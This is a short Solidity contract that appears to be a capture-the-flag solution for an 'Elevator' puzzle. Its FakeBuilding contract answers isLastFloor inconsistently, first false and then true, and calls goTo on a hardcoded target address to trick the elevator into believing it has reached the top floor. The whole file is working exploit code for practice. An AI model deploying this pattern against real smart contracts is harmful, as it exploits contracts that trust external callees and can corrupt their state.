pragma solidity ^0.4.18;

contract Elevator {
    function goTo(uint _floor) public;
}


contract FakeBuilding {
    bool public done = false;
    address public target = 0x7547ea99b169a5e7c7ca272434b43fe50d550639;

    function isLastFloor(uint _floor) view public returns (bool) {
        if (!done) {
            done = true;
            return false;
        } else {
            return true;
        }
    }

    function exploit() public {
        Elevator e = Elevator(target);
        e.goTo(0);
    }
}
